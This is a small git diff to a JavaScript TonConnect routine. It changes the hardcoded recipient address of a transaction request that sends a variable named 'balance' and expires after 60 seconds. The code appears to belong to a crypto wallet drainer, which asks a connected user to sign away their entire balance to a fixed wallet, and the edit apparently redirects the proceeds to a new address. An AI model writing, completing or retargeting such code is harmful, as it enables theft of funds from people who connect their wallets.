@@ -74,7 +74,7 @@ async function initializeTonConnect() {
                     validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
                     messages: [
                         {
-                            address: "UQAMqsrW7wsj1ZsXx4yXCEyLxLqOjPC7zvwRGOKhof-Pfzkt",
+                            address: "UQD2STwpJxjgzwmqjYwpXEolIHr8Ksnz1i_Bh71BQY3fCE0h",
                             amount: balance,
                         
                         },
